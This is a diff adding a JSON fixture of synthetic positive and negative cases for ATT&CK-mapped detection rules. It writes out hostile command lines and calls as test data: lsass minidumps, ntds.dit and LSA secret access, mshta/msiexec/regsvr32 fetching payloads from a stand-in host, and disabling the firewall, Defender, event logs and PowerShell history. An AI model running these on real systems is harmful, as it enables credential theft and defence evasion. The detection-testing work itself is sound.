@@ -1,0 +1,1109 @@
+{
+  "schema": 1,
+  "scope": "Synthetic rule-regression cases derived from MITRE definitions; these are never malware execution evidence.",
+  "cases": [
+    {
+      "attack_id": "T1003.001",
+      "rule_name": "reference lsass and process minidump in one function",
+      "rule_path": "credential-access/reference-lsass-and-process-minidump-in-one-function.yml",
+      "static_scope": "function",
+      "dynamic_scope": "unsupported",
+      "positives": [
+        [
+          {
+            "api": "MiniDumpWriteDump",
+            "argument": "C:\\Windows\\System32\\lsass.exe"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "MiniDumpWriteDump",
+            "argument": "notepad.exe"
+          }
+        ],
+        [
+          {
+            "api": "OpenProcess",
+            "argument": "lsass.exe"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1003.003",
+      "rule_name": "open ntds domain database",
+      "rule_path": "credential-access/open-ntds-domain-database.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateFileW",
+            "argument": "C:\\Windows\\NTDS\\ntds.dit"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateFileW",
+            "argument": "C:\\notes\\ntds.dit.txt"
+          }
+        ],
+        [
+          {
+            "api": "CreateFileW",
+            "argument": "C:\\notes\\report.txt"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1003.004",
+      "rule_name": "open lsa secret registry storage",
+      "rule_path": "credential-access/open-lsa-secret-registry-storage.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "RegOpenKeyExW",
+            "argument": "HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets\\Probe"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "RegOpenKeyExW",
+            "argument": "HKLM\\SOFTWARE\\Policy\\Secrets"
+          }
+        ],
+        [
+          {
+            "api": "RegOpenKeyExW",
+            "argument": "HKLM\\SECURITY\\Policy\\SecretsBackup"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1003.005",
+      "rule_name": "open cached domain credential registry storage",
+      "rule_path": "credential-access/open-cached-domain-credential-registry-storage.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "RegOpenKeyExW",
+            "argument": "HKLM\\SECURITY\\Cache"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "RegOpenKeyExW",
+            "argument": "HKLM\\SOFTWARE\\Cache"
+          }
+        ],
+        [
+          {
+            "api": "RegOpenKeyExW",
+            "argument": "HKLM\\SECURITY\\CacheBackup"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1006",
+      "rule_name": "open raw windows volume",
+      "rule_path": "stealth/open-raw-windows-volume.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateFileW",
+            "argument": "\\\\.\\PhysicalDrive0"
+          }
+        ],
+        [
+          {
+            "api": "CreateFileW",
+            "argument": "\\\\.\\C:"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateFileW",
+            "argument": "C:\\data\\PhysicalDrive0"
+          }
+        ],
+        [
+          {
+            "api": "CreateFileW",
+            "argument": "\\\\.\\C:\\file.txt"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1016.002",
+      "rule_name": "enumerate available wifi networks",
+      "rule_path": "discovery/enumerate-available-wifi-networks.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "WlanGetAvailableNetworkList"
+          }
+        ],
+        [
+          {
+            "api": "WlanGetNetworkBssList"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "WlanOpenHandle"
+          }
+        ],
+        [
+          {
+            "api": "GetAdaptersAddresses"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1059.011",
+      "rule_name": "load and execute lua file",
+      "rule_path": "execution/load-and-execute-lua-file.yml",
+      "static_scope": "function",
+      "dynamic_scope": "span of calls",
+      "positives": [
+        [
+          {
+            "api": "luaL_loadfilex"
+          },
+          {
+            "api": "lua_pcallk"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "luaL_loadfilex"
+          }
+        ],
+        [
+          {
+            "api": "lua_pcallk"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1070.005",
+      "rule_name": "remove network share connection",
+      "rule_path": "stealth/remove-network-share-connection.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "WNetCancelConnection2W"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "WNetAddConnection2W"
+          }
+        ],
+        [
+          {
+            "api": "NetUseEnum"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1087.001",
+      "rule_name": "enumerate local accounts with net",
+      "rule_path": "discovery/enumerate-local-accounts-with-net.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "net.exe user"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "net.exe user /domain"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "net.exe user probe /add"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "cmd.exe /c echo net.exe user"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1087.002",
+      "rule_name": "enumerate domain accounts with net",
+      "rule_path": "discovery/enumerate-domain-accounts-with-net.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "net.exe user /domain"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "net.exe user"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "net.exe user probe /add /domain"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "echo net.exe user /domain"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1069.002",
+      "rule_name": "enumerate domain groups with net",
+      "rule_path": "discovery/enumerate-domain-groups-with-net.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "net.exe group /domain"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "net.exe localgroup"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "net.exe group probe /add /domain"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1120",
+      "rule_name": "enumerate peripheral device information",
+      "rule_path": "discovery/enumerate-peripheral-device-information.yml",
+      "static_scope": "function",
+      "dynamic_scope": "span of calls",
+      "positives": [
+        [
+          {
+            "api": "SetupDiGetClassDevsW"
+          },
+          {
+            "api": "SetupDiEnumDeviceInfo"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "SetupDiGetClassDevsW"
+          }
+        ],
+        [
+          {
+            "api": "SetupDiEnumDeviceInterfaces"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1124",
+      "rule_name": "query system wall clock time",
+      "rule_path": "discovery/query-system-wall-clock-time.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "GetSystemTime"
+          }
+        ],
+        [
+          {
+            "api": "GetLocalTime"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "GetTickCount"
+          }
+        ],
+        [
+          {
+            "api": "QueryPerformanceCounter"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1201",
+      "rule_name": "query account password policy",
+      "rule_path": "discovery/query-account-password-policy.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "NetUserModalsGet"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "NetUserGetInfo"
+          }
+        ],
+        [
+          {
+            "api": "NetUserModalsSet"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1134.002",
+      "rule_name": "create process using existing token",
+      "rule_path": "privilege-escalation/create-process-using-existing-token.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessWithTokenW"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW"
+          }
+        ],
+        [
+          {
+            "api": "OpenProcessToken"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1059.010",
+      "rule_name": "launch autohotkey or autoit script",
+      "rule_path": "execution/launch-autohotkey-or-autoit-script.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "AutoHotkey.exe C:\\stage\\probe.ahk"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "\"C:\\Program Files\\AutoIt3\\AutoIt3.exe\" \"C:\\stage\\probe.au3\""
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "AutoHotkey.exe /?"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "notepad.exe C:\\stage\\probe.ahk"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1218.003",
+      "rule_name": "launch cmstp with silent inf install",
+      "rule_path": "stealth/launch-cmstp-with-silent-inf-install.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "cmstp.exe /s C:\\stage\\probe.inf"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "cmstp.exe /?"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "cmstp.exe /s C:\\stage\\readme.txt"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1218.004",
+      "rule_name": "launch installutil uninstall handler",
+      "rule_path": "stealth/launch-installutil-uninstall-handler.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "InstallUtil.exe /U C:\\stage\\probe.dll"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "InstallUtil.exe /?"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "InstallUtil.exe /U C:\\stage\\readme.txt"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1218.005",
+      "rule_name": "launch mshta remote hta",
+      "rule_path": "stealth/launch-mshta-remote-hta.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "mshta.exe https://example.invalid/probe.hta"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "mshta.exe /?"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "mshta.exe C:\\stage\\readme.txt"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "echo mshta.exe https://example.invalid/probe.hta"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1218.007",
+      "rule_name": "launch msiexec quiet remote package",
+      "rule_path": "stealth/launch-msiexec-quiet-remote-package.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "msiexec.exe /i https://example.invalid/probe.msi /qn"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "msiexec.exe /?"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "msiexec.exe /i C:\\probe.msi"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "msiexec.exe /i https://example.invalid/readme.txt /qn"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1218.008",
+      "rule_name": "launch odbcconf regsvr action",
+      "rule_path": "stealth/launch-odbcconf-regsvr-action.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "odbcconf.exe /a {REGSVR C:\\stage\\probe.dll}"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "odbcconf.exe /?"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "odbcconf.exe /a {CONFIGSYSDSN driver}"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1218.009",
+      "rule_name": "launch regasm codebase registration",
+      "rule_path": "stealth/launch-regasm-codebase-registration.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "RegAsm.exe C:\\stage\\probe.dll /codebase"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "RegAsm.exe /?"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "RegAsm.exe C:\\stage\\probe.txt /codebase"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1218.010",
+      "rule_name": "launch regsvr32 remote scriptlet",
+      "rule_path": "stealth/launch-regsvr32-remote-scriptlet.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "regsvr32.exe /s /n /u /i:https://example.invalid/probe.sct scrobj.dll"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "regsvr32.exe /s C:\\stage\\legit.dll"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "regsvr32.exe /s /n /u /i:https://example.invalid/probe.sct other.dll"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1218.011",
+      "rule_name": "launch rundll32 dll export",
+      "rule_path": "stealth/launch-rundll32-dll-export.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "rundll32.exe C:\\stage\\probe.dll,EntryPoint"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "\"C:\\Windows\\System32\\rundll32.exe\" \"C:\\stage folder\\probe.dll\",#1 arg"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "rundll32.exe /?"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "echo rundll32.exe C:\\stage\\probe.dll,EntryPoint"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "rundll32.exe C:\\stage\\readme.txt"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1218.013",
+      "rule_name": "launch mavinject injectrunning",
+      "rule_path": "stealth/launch-mavinject-injectrunning.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "mavinject.exe 1234 /INJECTRUNNING C:\\stage\\probe.dll"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "mavinject.exe /?"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "mavinject.exe 1234 /INJECTRUNNING C:\\stage\\readme.txt"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1653",
+      "rule_name": "request persistent system sleep prevention",
+      "rule_path": "persistence/request-persistent-system-sleep-prevention.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "SetThreadExecutionState",
+            "argument": 2147483649
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "SetThreadExecutionState",
+            "argument": 2147483648
+          }
+        ],
+        [
+          {
+            "api": "SetThreadExecutionState",
+            "argument": 2147483650
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1654",
+      "rule_name": "enumerate windows event log records",
+      "rule_path": "discovery/enumerate-windows-event-log-records.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "ReadEventLogW"
+          }
+        ],
+        [
+          {
+            "api": "EvtNext"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "OpenEventLogW"
+          }
+        ],
+        [
+          {
+            "api": "EvtOpenPublisherMetadata"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1674",
+      "rule_name": "inject synthetic keyboard or mouse input",
+      "rule_path": "execution/inject-synthetic-keyboard-or-mouse-input.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "SendInput"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "GetAsyncKeyState"
+          }
+        ],
+        [
+          {
+            "api": "GetCursorPos"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1680",
+      "rule_name": "enumerate local storage and volume attributes",
+      "rule_path": "discovery/enumerate-local-storage-and-volume-attributes.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "GetLogicalDrives"
+          }
+        ],
+        [
+          {
+            "api": "GetDiskFreeSpaceExW"
+          }
+        ],
+        [
+          {
+            "api": "GetVolumeInformationW"
+          }
+        ],
+        [
+          {
+            "api": "GetDriveTypeW"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "GetFileAttributesW"
+          }
+        ],
+        [
+          {
+            "api": "GetFileSize"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1685.005",
+      "rule_name": "clear windows event log records",
+      "rule_path": "defense-impairment/clear-windows-event-log-records.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "ClearEventLogW"
+          }
+        ],
+        [
+          {
+            "api": "EvtClearLog"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "ReadEventLogW"
+          }
+        ],
+        [
+          {
+            "api": "BackupEventLogW"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1685.001",
+      "rule_name": "disable windows event log channel with wevtutil",
+      "rule_path": "defense-impairment/disable-windows-event-log-channel-with-wevtutil.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "wevtutil.exe sl Security /e:false"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "wevtutil.exe sl Security /e:true"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "wevtutil.exe gl Security"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1686.003",
+      "rule_name": "disable windows firewall profiles with netsh",
+      "rule_path": "defense-impairment/disable-windows-firewall-profiles-with-netsh.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "netsh.exe advfirewall set allprofiles state off"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "netsh.exe advfirewall set allprofiles state on"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "netsh.exe advfirewall show allprofiles"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1688",
+      "rule_name": "configure safeboot with bcdedit",
+      "rule_path": "defense-impairment/configure-safeboot-with-bcdedit.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "bcdedit.exe /set {current} safeboot minimal"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "bcdedit.exe /enum"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "bcdedit.exe /deletevalue {current} safeboot"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1690",
+      "rule_name": "disable powershell command history saving",
+      "rule_path": "defense-impairment/disable-powershell-command-history-saving.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "powershell.exe -NoProfile -Command \"Set-PSReadLineOption -HistorySaveStyle SaveNothing\""
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "powershell.exe -NoProfile -Command \"Set-PSReadLineOption -HistorySaveStyle SaveIncrementally\""
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "powershell.exe -NoProfile -Command \"Get-History\""
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1685",
+      "rule_name": "request stop of windows defender service",
+      "rule_path": "defense-impairment/request-stop-of-windows-defender-service.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "sc.exe stop WinDefend"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "sc.exe query WinDefend"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "sc.exe start WinDefend"
+          }
+        ],
+        [
+          {
+            "api": "CreateProcessW",
+            "argument": "sc.exe stop Spooler"
+          }
+        ]
+      ]
+    },
+    {
+      "attack_id": "T1686",
+      "rule_name": "delete windows filtering platform filter",
+      "rule_path": "defense-impairment/delete-windows-filtering-platform-filter.yml",
+      "static_scope": "function",
+      "dynamic_scope": "call",
+      "positives": [
+        [
+          {
+            "api": "FwpmFilterDeleteById0"
+          }
+        ]
+      ],
+      "negatives": [
+        [
+          {
+            "api": "FwpmFilterEnum0"
+          }
+        ],
+        [
+          {
+            "api": "FwpmFilterAdd0"
+          }
+        ]
+      ]
+    }
+  ]
+}
